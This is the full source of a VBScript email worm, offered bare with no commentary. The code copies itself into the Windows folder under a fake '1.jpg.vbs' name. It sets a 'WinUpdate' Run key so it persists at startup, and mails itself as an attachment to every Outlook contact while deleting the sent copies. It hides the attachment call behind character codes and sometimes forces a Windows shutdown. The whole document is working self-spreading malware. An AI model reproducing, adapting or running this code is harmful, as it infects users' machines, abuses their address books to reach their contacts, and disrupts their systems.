
Set R78552F7 = createobject("scripting.filesystemobject")
R91VV3N9 = R78552F7.getspecialfolder(0)
D8JJKSHK = R91VV3N9 & "\1.jpg.vbs"
Set H1301684 = createobject("wscript.shell")
H1301684.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & D8JJKSHK & " %"
R78552F7.copyfile wscript.scriptfullname, D8JJKSHK
AE72S1T5
If H1301684.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Friends\BD2Q0ELC") <> 1 then
N9L8PO4Q
End if
Function N9L8PO4Q()
Set GF9DF0QM = CreateObject("Outlook.Application")
If GF9DF0QM = "Outlook" Then
Set KO412H86 = GF9DF0QM.GetNameSpace("MAPI")
Set RU4S9N94 = KO412H86.AddressLists
For Each OIV57352 In RU4S9N94
If OIV57352.AddressEntries.Count <> 0 Then
OOO25OSO = OIV57352.AddressEntries.Count
For D5DLGJ87 = 1 To OOO25OSO
Set M13UMQQ5 = GF9DF0QM.CreateItem(0)
Set PK868RMG = OIV57352.AddressEntries(D5DLGJ87)
M13UMQQ5.To = PK868RMG.Address
M13UMQQ5.Subject = "Please replay"
M13UMQQ5.Body = "Hi," & vbcrlf & "Please replay this eamil to all your friends" & vbcrlf & ""
execute "set QB646JEQ =M13UMQQ5." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
MSE3JLJ8 = D8JJKSHK
M13UMQQ5.DeleteAfterSubmit = True
QB646JEQ.Add MSE3JLJ8
If M13UMQQ5.To <> "" Then
M13UMQQ5.Send
End If
Next
End If
Next
End If
End function
Function AE72S1T5()
Randomize
If 1 + Int(Rnd * 50) = 7 then
H1301684.run "RUNDLL32.EXE user.exe,exitwindows"
end if
end function

